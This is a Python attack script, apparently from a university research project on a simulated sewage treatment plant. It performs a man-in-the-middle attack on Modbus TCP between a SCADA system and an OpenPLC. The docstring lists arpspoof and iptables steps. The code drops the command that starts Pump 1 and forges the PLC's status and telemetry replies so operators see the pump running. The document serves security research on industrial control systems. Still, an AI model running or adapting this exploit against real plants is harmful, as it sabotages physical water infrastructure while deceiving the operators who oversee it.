"""
Exploit MitM - Manipulação de Atuador Bomba 1 (v5 - Final)
============================================================
Projeto: Simulador Virtual de ETE para Análise de Segurança Cibernética
Autora:  Leticia dos Santos Matos (PIBIT/UNIFEI 2025)
Fonte:   Testes Man-in-the-Middle (dez/2025)

Descrição:
    Script de ataque que intercepta pacotes Modbus TCP via NetfilterQueue.
    Bloqueia fisicamente o acionamento da Bomba 1, enquanto falsifica as
    respostas de confirmação enviadas ao SCADA (ilusão de funcionamento).

    Mecanismo fake_mode: controla quando as respostas do PLC devem ser
    manipuladas, garantindo consistência visual no SCADA.

    Strict Mode: só altera pacotes com Unit ID = 0x01 e endereço 00 00,
    evitando corrupção de memória da Bomba 2.

    Pré-requisito:
        arpspoof -i eth0 -t <IP_SCADA> <IP_PLC>       (Terminal 1)
        arpspoof -i eth0 -t <IP_PLC>   <IP_SCADA>     (Terminal 2)
        iptables -I FORWARD -j NFQUEUE --queue-num 0   (Terminal 3)
        python3 mitm_bomba1.py                         (Terminal 3)

    ATENÇÃO: Para uso exclusivo em ambiente de pesquisa controlado.

Dependências: pip install scapy netfilterqueue
"""

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

# --- CONFIGURAÇÕES ---
IP_ALVO_PLC  = "192.168.0.85"   # IP do OpenPLC (ajustar conforme ambiente)
PORTA_MODBUS = 502

# --- ASSINATURAS MODBUS IDENTIFICADAS ---
# Função 05 (Write Single Coil) - Bomba 1, Endereço 00 00
SIG_LIGAR   = b'\x01\x05\x00\x00\xff\x00'  # Unit 01 | Func 05 | Addr 0 | Val FF00
SIG_DESLIGAR= b'\x01\x05\x00\x00\x00\x00'  # Unit 01 | Func 05 | Addr 0 | Val 0000

# Bytes de status (Função 02 - Read Discrete Inputs)
STATUS_BOMBA_OFF = b'\x08'  # 0000 1000: válvula recirculação aberta
STATUS_BOMBA_ON  = b'\x07'  # 0000 0111: bomba + válvulas de fluxo abertas

# Sufixos de telemetria
TELEMETRIA_OFF = b'\x10\x0e\xe0'
TELEMETRIA_ON  = b'\x11\x12\xfa'

# --- CONTROLE DE ESTADO ---
fake_mode = False  # True = ataque ativo, manter ilusão ON no SCADA


def process_packet(packet):
    global fake_mode

    scapy_packet = IP(packet.get_payload())

    if not (scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw)):
        packet.accept()
        return

    payload = bytes(scapy_packet[Raw].load)

    # --- COMANDO: SCADA -> PLC (LIGAR Bomba 1) ---
    # Strict Mode: só age se começar com \x01 e tiver endereço 00 00
    if payload[:6] == SIG_LIGAR:
        fake_mode = True
        print("[COMANDO] LIGAR Bomba 1. Bloqueando físico + Ativando Ilusão.")
        packet.drop()   # Bloqueia o comando real ao PLC
        return

    # --- COMANDO: SCADA -> PLC (DESLIGAR Bomba 1) ---
    if payload[:6] == SIG_DESLIGAR:
        fake_mode = False
        print("[COMANDO] DESLIGAR Bomba 1. Desativando Ilusão.")
        packet.accept()
        return

    # --- RESPOSTA: PLC -> SCADA (falsificar status durante fake_mode) ---
    if fake_mode and scapy_packet[IP].src == IP_ALVO_PLC:
        modified = payload

        # Substitui byte de status: faz SCADA ver Bomba ON
        if STATUS_BOMBA_OFF in modified:
            modified = modified.replace(STATUS_BOMBA_OFF, STATUS_BOMBA_ON)
            print("[STATUS] Byte de status falsificado: 08 -> 07 (Ilusão ON).")

        # Substitui sufixo de telemetria
        if TELEMETRIA_OFF in modified:
            modified = modified.replace(TELEMETRIA_OFF, TELEMETRIA_ON)

        if modified != payload:
            scapy_packet[Raw].load = modified
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = NetfilterQueue()
queue.bind(0, process_packet)
print("[*] MitM Bomba 1 ativo. Aguardando pacotes Modbus TCP...")
print(f"    Alvo PLC: {IP_ALVO_PLC}:{PORTA_MODBUS}")

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Encerrado.")
finally:
    queue.unbind()
